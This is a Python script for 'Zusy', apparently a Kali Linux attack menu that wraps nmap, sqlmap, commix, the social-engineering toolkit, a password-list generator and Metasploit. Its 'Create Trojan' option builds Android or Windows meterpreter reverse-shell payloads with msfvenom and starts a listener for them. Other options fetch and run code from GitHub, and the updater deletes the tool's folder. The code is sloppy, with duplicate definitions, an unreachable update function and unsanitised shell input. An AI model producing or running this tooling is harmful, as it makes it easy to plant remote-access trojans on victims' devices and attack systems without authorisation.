# Credits
# Creator : No_Name.exe
# Zusy

from subprocess import run, PIPE
import os
from difflib import get_close_matches

def clear_screen():
    os.system('clear')
from subprocess import run, PIPE
import os

def get_kali_ip():
    # Kali Linux'un IP adresini almak için ifconfig komutunu kullanın
    process = run("ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -n 1", shell=True, stdout=PIPE, text=True)
    if process.returncode == 0:
        return process.stdout.strip()
    else:
        return None

def create_trojan():
    clear_screen()
    print("[0] Back\n")
    print("[1] Android")
    print("[2] Windows")
    
    platform_choice = input("Which operating system do you want to create for? (1/2): ")
    
    if platform_choice == "0":
        main_menu()
    
    platform = ""
    file_extension = ""
    
    if platform_choice == "1":
        platform = "android"
        file_extension = "apk"
    elif platform_choice == "2":
        platform = "windows"
        file_extension = "exe"
    else:
        print("Invalid choice.")
        create_trojan()
    
    clear_screen()
    lhost = input("LHOST = ")
    if not lhost:  # Eğer kullanıcı boş bir giriş yaparsa, Kali Linux'un IP adresini al
        lhost = get_kali_ip()
        if not lhost:
            print("Failed to get Kali Linux IP address.")
            input("\nPress Enter to continue...")
            main_menu()
    
    lport = input("LPORT = ")
    
    filedirectory = input("Please enter the file name: ")
    clear_screen()
    
    trojan_command = f"msfvenom -p {platform}/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {filedirectory}.{file_extension}"
    
    print("Please wait...")
                    
    process = run(trojan_command, shell=True)
    if process.returncode == 0:
        print(f"Trojan created! File directory => {os.getcwd()}/{filedirectory}.{file_extension}")
        print("Starting Metasploit...")
        msf_command = f"use exploit/multi/handler; set payload {platform}/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4242; exploit"
        run(f"msfconsole -q -x '{msf_command}'", shell=True)
    else:
        print("Trojan creation failed.")
        
    input("\nPress Enter to continue...")
    main_menu()


import subprocess

def clear_screen():
    # Ekranı temizlemek için uygun bir komut kullanın
    subprocess.run("clear", shell=True)

def ip_tracer():
    clear_screen()
    print("[0] Back\n")
    target_ip = input("Enter IP Address: ")
    if target_ip == "0":
        main_menu()
    
    if not target_ip:
        print("\033[91mError: Please enter a valid IP address\033[0m")
        input("\nPress Enter to go back...")
        main_menu()
        return
    
    ip_tracer_command = f"curl ipinfo.io/{target_ip}"
    print("Please wait...")
    process = subprocess.run(ip_tracer_command, shell=True, capture_output=True, text=True)
    if process.stdout is not None:
        print(process.stdout)
    else:
        print("")
    input("\nPress Enter to go back...")
    main_menu()



def nmap_scan():
    clear_screen()
    print("[0] Back\n")
    target_ip = input("Target IP: ")
    if target_ip == "0":
        main_menu()
    nmap_command = f"nmap -p1-65535 -sV -sS -T4 -A -O {target_ip}"
    print("Please Wait")
    process = run(nmap_command, shell=True)
    if process.stdout is not None:
        print(process.stdout.decode())
    else:
        print("Nmap scan completed.")
    input("\nPress Enter to go back...")
    main_menu()    
    
def netdiscover():
    clear_screen()
    netdiscover_command = f"netdiscover"
    print("Please Wait")
    process = run(netdiscover_command, shell=True)
    if process.stdout is not None:
        print(process.stdout.decode())
    else:
        print("")
    input("\nPress Enter to go back...")
    main_menu()        
    
def sql_scan():
    clear_screen()
    print("[0] Back\n")
    target_ip = input("Target Web Site Link: ")
    if target_ip == "0":
        main_menu()
    nmap_command = f"sqlmap -u {target_ip}"
    print("Please Wait")
    process = run(nmap_command, shell=True)
    if process.stdout is not None:
        print(process.stdout.decode())
    else:
        print("Scan completed.")
    input("\nPress Enter to go back...")
    main_menu()    
    
def commix_scan():
    clear_screen()
    print("[0] Back\n")
    target_ip = input("Target Web Site Link: ")
    if target_ip == "0":
        main_menu()
    nmap_command = f"commix -u {target_ip}"
    print("Please Wait")
    process = run(nmap_command, shell=True)
    if process.stdout is not None:
        print(process.stdout.decode())
    else:
        print("Scan completed.")
    input("\nPress Enter to go back...")
    main_menu()        


def open_metasploit():
    clear_screen()
    process = run("msfconsole -q", shell=True)
    
def cupp_open():
    clear_screen()
    process = run("which cupp", shell=True, stdout=PIPE, stderr=PIPE)
    if process.returncode == 0:
        print("")
        run("cupp -i", shell=True)
    else:
        print("Cupp is not installed. Installing...")
        install_command = "sudo apt install cupp"
        process = run(install_command, shell=True)
        if process.returncode == 0:
            print("Cupp installed successfully. Opening...")
            run("cupp -i", shell=True)
        else:
            print("Failed to install Cupp.")
    input("\nPress Enter to go back...")
    main_menu()
 
    
def update_kali():
    clear_screen()
    process = run("sudo apt update && sudo apt upgrade", shell=True)    
    
def ifconfig():
    clear_screen()
    process = run("ifconfig", shell=True)
    if process.stdout is not None:
        print(process.stdout.decode())
    else:
        print("")
    input("\nPress Enter to go back...")
    main_menu()    
    
def kali_undercover():
    clear_screen()
    process = run("kali-undercover && python3 OpenZusy.py", shell=True)    
    
import subprocess

def reboot_system():
    clear_screen()
    input("Press Enter to continue...")
    process = subprocess.run("sudo reboot", shell=True)
  

def social_engineering():
    clear_screen()
    process = run("setoolkit", shell=True)

import os
import subprocess

import subprocess

def main_menu():
    clear_screen()
    logo = """
      ╔════╦╗─╔╦═══╦╗──╔╗
      ╚══╗═║║─║║╔═╗║╚╗╔╝║
      ──╔╝╔╣║─║║╚══╬╗╚╝╔╝
      ─╔╝╔╝║║─║╠══╗║╚╗╔╝─
      ╔╝═╚═╣╚═╝║╚═╝║─║║──
      ╚════╩═══╩═══╝─╚╝──
-------{ By No_Name.exe }-------
                        v 1.4
    """
    print(logo)
    print("[1] Nmap Scan\n[2] Open Metasploit\n[3] Social Engineering\n[4] SQL Injection\n[5] Commix\n[6] Restart System\n[7] Become Windows (on/off)\n[8] Upgrade System\n[9] Password Found\n[10] System About\n[11] Create Trojan\n[12] IP-Tracer\n[13] Netdiscover\n[14] ThreatManager\n[99] Exit\n"
    "\n[100] Update\n")
    choice = input("Zusy ~$ ")
    if choice == "1":
        nmap_scan()
    elif choice == "2":
        open_metasploit()
    elif choice == "3":
        social_engineering()
    elif choice == "4":
        sql_scan()
    elif choice == "5":
        commix_scan()    
    elif choice == "6":
        reboot_system()
    elif choice == "7":
        kali_undercover()  
    elif choice == "8":
        update_kali()   
    elif choice == "9":
        cupp_open() 
    elif choice == "10":
        ifconfig()      
    elif choice == "11":
        create_trojan()   
    elif choice == "12":
        ip_tracer() 
    elif choice == "13":
        netdiscover()   
    elif choice == "14":
        threat_manager()                     
    elif choice == "100":
        update_tool()  
    elif choice == "99":
        print("\nThanks For Using!!!")
    else:
        print("\nError: Please Try Again")
        main_menu()

        
def threat_manager():
    import os
    if os.path.isdir("ThreatManager"):
        os.system("cd .. && cd ThreatManager && python3 OpenThreat.py")
    else:
        os.system("cd .. && git clone https://github.com/NoNameZusy/ThreatManager.git")
        os.system("cd .. && cd ThreatManager && python3 OpenThreat.py")        

main_menu()

def update_tool():
    try:
        print("Updating tool...")
        # Doğrudan komutları çalıştır
        subprocess.run("cd .. && rm -rf Zusy && git clone https://github.com/MMOGAMER0101/Zusy.git && cd Zusy && python3 OpenZusy.py", shell=True)
    except Exception as e:
        print("Error updating tool:", e)

main_menu()
